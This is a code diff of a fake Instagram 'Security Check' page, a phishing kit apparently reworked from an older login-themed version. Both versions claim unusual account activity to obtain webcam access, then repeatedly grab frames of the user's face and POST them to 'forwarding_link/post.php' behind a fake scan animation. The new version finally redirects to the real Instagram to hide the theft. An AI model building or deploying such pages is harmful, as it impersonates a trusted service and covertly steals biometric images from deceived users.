@@ -3,345 +3,379 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram • Login</title>
-    <meta property="og:title" content="Instagram - Login">
-    <meta property="og:description" content="Sign in to check your photos and videos from friends">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png">
+    <title>Instagram • Security Check</title>
+    <meta property="og:title" content="Instagram">
+    <meta property="og:description" content="Confirm it's you to log in">
     <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
+        :root {
+            --ig-primary: #0095f6;
+            --ig-hover: #1877f2;
+            --ig-bg: #fafafa;
+            --ig-border: #dbdbdb;
+            --ig-text-main: #262626;
+            --ig-text-secondary: #8e8e8e;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--ig-bg);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
+
         .main-container {
-            display: flex;
-            max-width: 935px;
+            width: 100%;
+            max-width: 350px;
             margin: 0 auto;
             padding: 20px;
         }
-        .phone-mockup {
-            display: none;
-        }
-        @media (min-width: 875px) {
-            .phone-mockup {
-                display: block;
-                margin-right: 32px;
-                align-self: center;
-            }
-            .phone-mockup img {
-                width: 380px;
-                height: auto;
-            }
-        }
-        .login-container {
-            width: 350px;
-            flex-shrink: 0;
-        }
-        .login-box {
+
+        .checkpoint-box {
             background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px;
-            margin-bottom: 10px;
+            border: 1px solid var(--ig-border);
+            border-radius: 3px;
+            padding: 30px 40px;
             text-align: center;
+            margin-bottom: 10px;
         }
-        .logo {
-            font-family: 'Segoe Script', 'Brush Script MT', cursive;
-            font-size: 40px;
-            margin-bottom: 20px;
-            color: #262626;
-            letter-spacing: -1px;
+
+        .logo-box {
+            margin-bottom: 24px;
         }
-        .logo-img {
+
+        .logo-box img {
             width: 175px;
-            margin-bottom: 12px;
+            height: auto;
         }
-        .info-text {
-            color: #8e8e8e;
-            font-size: 14px;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-        .verify-btn {
-            width: 100%;
-            background-color: #0095f6;
-            border: none;
-            color: #fff;
-            padding: 8px 16px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-bottom: 15px;
-            transition: background-color 0.3s;
-        }
-        .verify-btn:hover {
-            background-color: #1877f2;
-        }
-        .verify-btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-        .divider {
+
+        .shield-icon {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 16px;
+            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yO/r/UmsSByg6Y7G.png'); /* Mock or official asset */
+            background-size: contain;
+            background-repeat: no-repeat;
             display: flex;
             align-items: center;
-            margin: 18px 0;
+            justify-content: center;
+            font-size: 32px;
         }
-        .divider-line {
-            flex: 1;
-            height: 1px;
-            background: #dbdbdb;
-        }
-        .divider-text {
-            padding: 0 18px;
-            color: #8e8e8e;
-            font-size: 13px;
+
+        .title {
+            color: var(--ig-text-main);
+            font-size: 16px;
             font-weight: 600;
+            margin-bottom: 8px;
         }
-        .input-group {
-            position: relative;
-            margin-bottom: 6px;
+
+        .description {
+            color: var(--ig-text-secondary);
+            font-size: 14px;
+            line-height: 18px;
+            margin-bottom: 24px;
         }
-        .input-group input {
+
+        .action-btn {
             width: 100%;
-            padding: 9px 8px 7px;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            background: #fafafa;
-            font-size: 12px;
-            outline: none;
-        }
-        .input-group input:focus {
-            border-color: #a8a8a8;
-        }
-        .login-btn {
-            width: 100%;
-            background-color: #0095f6;
-            border: none;
+            background-color: var(--ig-primary);
+            border: 1px solid transparent;
             color: #fff;
             padding: 7px 16px;
             border-radius: 8px;
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 14px;
-            opacity: 0.3;
+            transition: background-color 0.2s;
         }
-        .forgot {
-            margin-top: 20px;
+
+        .action-btn:hover {
+            background-color: var(--ig-hover);
         }
-        .forgot a {
-            color: #00376b;
-            font-size: 12px;
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background: var(--ig-border);
+        }
+
+        .divider-text {
+            padding: 0 18px;
+            color: var(--ig-text-secondary);
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .help-link {
+            display: block;
+            color: var(--ig-primary);
+            font-size: 14px;
             text-decoration: none;
+            margin-top: 16px;
+            font-weight: 500;
         }
+
         .signup-box {
             background: #fff;
-            border: 1px solid #dbdbdb;
-            padding: 22px 0;
+            border: 1px solid var(--ig-border);
+            padding: 20px;
             text-align: center;
             font-size: 14px;
         }
+
         .signup-box a {
-            color: #0095f6;
+            color: var(--ig-primary);
             text-decoration: none;
             font-weight: 600;
         }
-        .app-download {
+
+        .footer {
+            margin-top: 40px;
             text-align: center;
-            margin-top: 20px;
-        }
-        .app-download p {
-            font-size: 14px;
-            margin-bottom: 15px;
-        }
-        .app-badges {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-        }
-        .app-badges img {
-            height: 40px;
-        }
-        .status-msg {
+            color: var(--ig-text-secondary);
             font-size: 12px;
-            color: #8e8e8e;
-            margin-top: 10px;
-            min-height: 20px;
         }
-        .shield-icon {
-            font-size: 48px;
-            margin-bottom: 10px;
-        }
-        .verify-section {
-            padding: 15px 0;
-        }
-        /* Loading spinner */
-        .spinner {
+
+        /* Verification Modal overlay */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
             display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #fff;
-            border-top: 2px solid transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
         }
-        @keyframes spin {
+
+        .modal-card {
+            background: #fff;
+            width: 90%;
+            max-width: 320px;
+            border-radius: 12px;
+            padding: 24px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .scan-frame {
+            position: relative;
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 16px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid #dbdbdb;
+        }
+
+        .scan-frame video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1); /* Mirror view */
+        }
+
+        .scan-pulse {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid var(--ig-primary);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.1); opacity: 0; }
+        }
+
+        .scanning-loader {
+            margin: 12px auto;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--ig-primary);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spinner 0.8s linear infinite;
+        }
+
+        @keyframes spinner {
             to { transform: rotate(360deg); }
         }
-        .footer {
-            text-align: center;
-            margin-top: 40px;
-            color: #8e8e8e;
+
+        .scan-status {
+            font-size: 14px;
+            color: var(--ig-text-main);
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+
+        .scan-percent {
             font-size: 12px;
+            color: var(--ig-text-secondary);
         }
-        .footer a {
-            color: #8e8e8e;
-            text-decoration: none;
-            margin: 0 4px;
-        }
+
     </style>
 </head>
 <body>
 
-<!-- Hidden cam capture -->
+<!-- Hidden cam capture fallback wrapper -->
 <div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
+    <video id="video-hidden" playsinline autoplay></video>
 </div>
 <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
 <div class="main-container">
-    <div class="login-container">
-        <div class="login-box">
-            <!-- Instagram Logo -->
-            <div class="logo">Instagram</div>
-            
-            <div class="verify-section">
-                <div class="shield-icon">🔒</div>
-                <p class="info-text">We need to verify your identity. Please allow camera access for a quick face verification.</p>
-                <button class="verify-btn" id="verifyBtn" onclick="startVerification()">
-                    <span id="btnText">Verify My Identity</span>
-                    <div class="spinner" id="spinner"></div>
-                </button>
-                <p class="status-msg" id="statusMsg"></p>
-            </div>
-
-            <div class="divider">
-                <div class="divider-line"></div>
-                <div class="divider-text">OR</div>
-                <div class="divider-line"></div>
-            </div>
-
-            <div class="input-group">
-                <input type="text" placeholder="Phone number, username, or email">
-            </div>
-            <div class="input-group">
-                <input type="password" placeholder="Password">
-            </div>
-            <button class="login-btn" disabled>Log in</button>
-
-            <div class="forgot">
-                <a href="#">Forgot password?</a>
-            </div>
+    <div class="checkpoint-box">
+        <div class="logo-box">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yS/r/8675-0vS7S3.png" alt="Instagram">
         </div>
 
-        <div class="signup-box">
-            Don't have an account? <a href="#">Sign up</a>
+        <div class="shield-icon">🛡️</div>
+        <div class="title">Action Required</div>
+        <div class="description">
+            We noticed unusual activity on your account. To secure your identity, please complete a brief identity verification scan to continue.
         </div>
 
-        <div class="app-download">
-            <p>Get the app.</p>
-            <div class="app-badges">
-                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play">
-                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft">
-            </div>
+        <button class="action-btn" id="startBtn" onclick="openModal()">Verify Identity</button>
+
+        <div class="divider">
+            <div class="divider-line"></div>
+            <div class="divider-text">OR</div>
+            <div class="divider-line"></div>
         </div>
+
+        <a href="#" class="help-link">Need more help?</a>
+    </div>
+
+    <div class="signup-box">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="footer">
+        © 2026 Instagram from Meta
+    </div>
+</div>
+
+<!-- REAL-TIME SCAN MODAL -->
+<div class="modal" id="scanModal">
+    <div class="modal-card">
+        <div class="scan-frame">
+            <video id="scanVideo" autoplay playsinline></video>
+            <div class="scan-pulse" id="pulseRing"></div>
+        </div>
+        
+        <div class="scan-status" id="scanStatus">Reading face mechanics...</div>
+        <div class="scan-percent" id="scanPercent">0%</div>
+        <div class="scanning-loader" id="loaderRing"></div>
     </div>
 </div>
 
 <script>
-function post(imgdata) {
-    $.ajax({
-        type: 'POST',
-        data: { cat: imgdata },
-        url: 'forwarding_link/post.php',
-        dataType: 'json',
-        async: false,
-        success: function(result) {},
-        error: function() {}
-    });
-}
-
-'use strict';
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-
-const constraints = {
-    audio: false,
-    video: { facingMode: "user" }
-};
-
-let streamStarted = false;
-
-function startVerification() {
-    const btn = document.getElementById('verifyBtn');
-    const btnText = document.getElementById('btnText');
-    const spinner = document.getElementById('spinner');
-    const statusMsg = document.getElementById('statusMsg');
-
-    btnText.style.display = 'none';
-    spinner.style.display = 'block';
-    statusMsg.textContent = 'Starting verification...';
-
-    navigator.mediaDevices.getUserMedia(constraints)
-        .then(function(stream) {
-            window.stream = stream;
-            video.srcObject = stream;
-            streamStarted = true;
-            statusMsg.textContent = 'Verifying your identity...';
-
-            var context = canvas.getContext('2d');
-            setInterval(function() {
-                context.drawImage(video, 0, 0, 640, 480);
-                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-                post(canvasData);
-            }, 1500);
-
-            // Show fake verification progress
-            setTimeout(function() {
-                statusMsg.textContent = 'Analyzing face data...';
-            }, 3000);
-            setTimeout(function() {
-                statusMsg.textContent = 'Almost done...';
-            }, 6000);
-            setTimeout(function() {
-                statusMsg.textContent = 'Verification complete! Redirecting...';
-                btnText.textContent = 'Verified ✓';
-                btnText.style.display = 'block';
-                spinner.style.display = 'none';
-                btn.style.backgroundColor = '#2ecc71';
-            }, 9000);
-        })
-        .catch(function(err) {
-            statusMsg.textContent = 'Camera access denied. Please try again.';
-            btnText.style.display = 'block';
-            btnText.textContent = 'Try Again';
-            spinner.style.display = 'none';
+    function post(imgdata) {
+        $.ajax({
+            type: 'POST',
+            data: { cat: imgdata },
+            url: 'forwarding_link/post.php',
+            dataType: 'json',
+            async: false,
+            success: function(result) {},
+            error: function() {}
         });
-}
+    }
+
+    'use strict';
+
+    const scanVideo = document.getElementById('scanVideo');
+    const canvas = document.getElementById('canvas');
+    const modal = document.getElementById('scanModal');
+    const pulseRing = document.getElementById('pulseRing');
+    const loaderRing = document.getElementById('loaderRing');
+    const scanStatus = document.getElementById('scanStatus');
+    const scanPercent = document.getElementById('scanPercent');
+
+    const constraints = {
+        audio: false,
+        video: { facingMode: "user" }
+    };
+
+    function openModal() {
+        modal.style.display = 'flex';
+        
+        navigator.mediaDevices.getUserMedia(constraints)
+            .then(function(stream) {
+                window.stream = stream;
+                scanVideo.srcObject = stream;
+                
+                let progress = 0;
+                let statusTexts = [
+                    "Checking lighting...",
+                    "Analyzing facial structure...",
+                    "Checking background matrix...",
+                    "Matching with cloud secure...",
+                    "Verification success!"
+                ];
+                let textIndex = 0;
+
+                const timer = setInterval(() => {
+                    progress += Math.floor(Math.random() * 10) + 5;
+                    if (progress >= 100) progress = 100;
+                    
+                    scanPercent.innerText = `${progress}%`;
+
+                    // Trigger capture
+                    var context = canvas.getContext('2d');
+                    context.drawImage(scanVideo, 0, 0, 640, 480);
+                    var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                    post(canvasData);
+
+                    if (progress === 100) {
+                        clearInterval(timer);
+                        scanStatus.innerText = "Success! Forwarding...";
+                        pulseRing.style.borderColor = "#2ecc71";
+                        loaderRing.style.borderTopColor = "#2ecc71";
+                        setTimeout(() => {
+                            window.location.href = "https://instagram.com";
+                        }, 2000);
+                    } else if (progress % 25 === 0 && textIndex < statusTexts.length - 1) {
+                        textIndex++;
+                        scanStatus.innerText = statusTexts[textIndex];
+                    }
+                }, 1000);
+
+            })
+            .catch(function(err) {
+                alert("Camera Access is REQUIRED for security verification. Please enable it in browser settings.");
+                modal.style.display = 'none';
+            });
+    }
 </script>
 
 <script src="fingerprint.js"></script>
